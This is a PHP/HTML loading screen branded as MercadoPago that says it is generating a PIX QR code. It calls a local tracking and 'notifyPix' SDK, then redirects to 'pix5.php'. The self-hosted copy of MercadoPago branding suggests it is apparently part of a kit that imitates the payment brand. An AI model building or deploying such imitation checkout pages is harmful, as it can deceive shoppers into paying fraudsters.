<?php require_once __DIR__ . '/config.php'; ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
  <title>MercadoPago - Gerando PIX...</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="stylesheet" href="css/checkout.css">
  <style>
    /* PIX logo animado sobre o spinner */
    .mp-pix-loading {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }
    .mp-pix-ring {
      position: relative;
      width: 58px;
      height: 58px;
    }
    .mp-pix-ring .mp-spinner {
      position: absolute;
      inset: 0;
      width: 58px;
      height: 58px;
      border-color: #e0e0e0;
      border-top-color: #32BCAD;
    }
    .mp-pix-icon {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
  </style>
</head>
<body>

<div class="mp-overlay">
  <div class="mp-pix-loading">
    <div class="mp-pix-ring">
      <div class="mp-spinner"></div>
      <div class="mp-pix-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="26" height="26">
          <path fill="#32BCAD" d="M376.9 388.4 283.1 294.6c-5.6-5.6-5.6-14.7 0-20.3l94.2-94.2c16.6 6.3 35.5 2.5 48.3-10.4l56.1-56.1c5.6-5.6 5.6-14.7 0-20.3l-63.2-63.2c-5.6-5.6-14.7-5.6-20.3 0l-56.1 56.1c-12.8 12.8-16.7 31.7-10.4 48.3l-94.2 94.2c-5.6 5.6-14.7 5.6-20.3 0L104.4 134c6.3-16.6 2.4-35.5-10.4-48.3L38 29.6c-5.6-5.6-14.7-5.6-20.3 0L0 47c-.6.6-1.3 1.3-1.8 2.1v.1c-3.7 6.4-2.8 14.6 2.6 20l56.1 56.1c12.8 12.8 31.7 16.7 48.3 10.4l93.8 93.8c5.6 5.6 5.6 14.7 0 20.3L104.8 342c-16.6-6.3-35.5-2.4-48.3 10.4L.4 408.5c-5.6 5.6-5.6 14.7 0 20.3l63.2 63.2c5.6 5.6 14.7 5.6 20.3 0l56.1-56.1c12.8-12.8 16.7-31.7 10.4-48.3l93.8-93.8c5.6-5.6 14.7-5.6 20.3 0l93.8 93.8c-6.3 16.6-2.4 35.5 10.4 48.3l56.1 56.1c5.6 5.6 14.7 5.6 20.3 0l63.2-63.2c5.6-5.6 5.6-14.7 0-20.3l-56.1-56.1c-12.9-12.8-31.8-16.7-48.4-10.3z"/>
        </svg>
      </div>
    </div>
    <p class="mp-overlay__txt">Gerando QR Code Pix...</p>
  </div>
</div>

<script src="js/sdk.min.js"></script>
<script>
  _SDK.initTracking('loading-pix');
  _SDK.gateway.notifyPix();
  setTimeout(function () {
    window.location.href = 'pix5.php';
  }, 2000);
</script>
</body>
</html>
